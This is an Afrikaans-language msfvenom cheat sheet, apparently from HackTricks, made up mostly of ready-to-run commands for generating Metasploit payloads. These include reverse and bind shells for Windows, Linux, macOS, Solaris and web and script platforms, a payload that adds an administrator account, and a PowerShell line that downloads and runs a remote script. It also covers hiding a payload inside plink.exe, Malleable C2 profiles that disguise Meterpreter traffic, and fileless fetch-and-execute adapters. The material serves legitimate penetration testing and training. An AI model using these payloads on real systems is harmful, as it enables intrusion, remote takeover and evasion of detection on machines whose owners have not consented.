# MSFVenom - CheatSheet

{{#include ../../banners/hacktricks-training.md}}

---

## Basiese msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Gebruik `-a` om die payload-argitektuur te kies en `--platform` om sy teikenplatform te kies.<sup>[[1]](#references)</sup>

## Lys
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
Hierdie opdragte lys die payload- en encoder-modules wat in die geïnstalleerde framework beskikbaar is.<sup>[[1]](#references)</sup>

## Algemene params wanneer shellcode geskep word
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
Die flags wat hier getoon word, kies bad characters, output format, encoder en encoding iterations.<sup>[[1]](#references)</sup>

## HTTP(S) Meterpreter-verkeersvorming

Metasploit 6.5 het die `MALLEABLEC2`-opsie by staged en stageless reverse HTTP(S) Meterpreter-payloads gevoeg. Die profiel kan URI's, user agents, request/response headers, connection-ID-plasing en ondersteunde body-encodings/wrappers verander. Beide die gegenereerde payload en sy handler moet dieselfde plaaslike profiel laai. 'n Staged payload se aanvanklike versoek vir die Meterpreter-stage word nie aangepas nie; verkies dus 'n stageless payload soos `windows/x64/meterpreter_reverse_https` wanneer die eerste versoek ook by die profiel moet pas.<sup>[[3]](#references)</sup>
```bash
msfvenom -p windows/x64/meterpreter_reverse_https \
LHOST=10.10.10.10 LPORT=443 MALLEABLEC2=/opt/profiles/web.profile \
-f exe -o reverse_https.exe
```
Konfigureer die ooreenstemmende handler met die identiese payload en profiel:<sup>[[3]](#references)</sup>
```text
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST 10.10.10.10
set LPORT 443
set MALLEABLEC2 /opt/profiles/web.profile
run
```
Slegs die direktiewe wat as geïmplementeer gedokumenteer is, beïnvloed verkeer; nie-ondersteunde profielblokke kan suksesvol ontleed word sonder om enige effek te hê.<sup>[[3]](#references)</sup>

## **Windows**

### **Reverse Shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### Skep gebruiker
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Voer bevel uit**
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Encoder
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
> **Encoding is nie AV-ontduiking nie:** encoders soos `x86/shikata_ga_nai` is hoofsaaklik nuttig om aan bad-character-beperkings te voldoen. Herhaalde encoding is nie ’n betroubare AV-ontduikingstegniek nie.<sup>[[1]](#references)</sup>

### Ingebed binne uitvoerbare lêer
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
## Linux Payloads

### Reverse Shell
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **Reverse Shell:**
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **Bind Shell**
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Webgebaseerde Payloads**

### **PHP**

#### Reverse shel**l**
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
### ASP/x

#### Reverse shell
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
### JSP

#### Reverse shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
### WAR

#### Reverse Shell
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Script Language payloads**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
## Fetch payload adapters

Fetch payloads genereer ’n opdrag wat ’n beskikbare teikenhulpmiddel laat aflaai en ’n onderliggende native payload laat uitvoer. Hul name volg `cmd/<platform>/<fetch-protocol>/<served-payload>`; HTTP(S)-, SMB- en TFTP-adapters is beskikbaar, met downloader-keuses wat van die teikenplatform afhang.<sup>[[2]](#references)</sup>

Byvoorbeeld, genereer ’n Linux `wget`-opdrag wat ’n x64 Meterpreter-payload vanaf poort 8080 ophaal en dit op poort 4444 laat terugkoppel:<sup>[[2]](#references)</sup>
```bash
msfvenom -p cmd/linux/http/x64/meterpreter/reverse_tcp \
FETCH_COMMAND=WGET FETCH_SRVHOST=10.10.10.10 FETCH_SRVPORT=8080 \
LHOST=10.10.10.10 LPORT=4444 -f raw
```
Begin die **fetch handler** met dieselfde instellings; dit huisves die gegenereerde ELF en begin ook die handler vir die bediende Meterpreter payload:<sup>[[2]](#references)</sup>
```text
use payload/cmd/linux/http/x64/meterpreter/reverse_tcp
set FETCH_COMMAND WGET
set FETCH_SRVHOST 10.10.10.10
set FETCH_SRVPORT 8080
set LHOST 10.10.10.10
set LPORT 4444
to_handler
```
Nuttige afhanklike opsies sluit `FETCH_PIPE=true` in om ’n korter HTTP(S)-opdrag te genereer waar dit ondersteun word, asook `FETCH_FILELESS=shell`, `shell-search`, of `python3.8+` om ’n Linux ELF vanaf ’n anonieme lêerbeskrywer uit te voer. Fileless-modusse vereis Linux-kernweergawe 3.17 of later; ondersoek die presiese adapter met `msfvenom -p <FETCH_PAYLOAD> --list-options`, omdat ondersteunde kombinasies kan verskil.<sup>[[2]](#references)</sup>



## References

- [1] [Hoe om msfvenom te gebruik](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
- [2] [Hoe om Fetch Payloads te gebruik](https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html)
- [3] [Aanpasbare C2-profiele](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-malleable-c2-profiles.html)
{{#include ../../banners/hacktricks-training.md}}
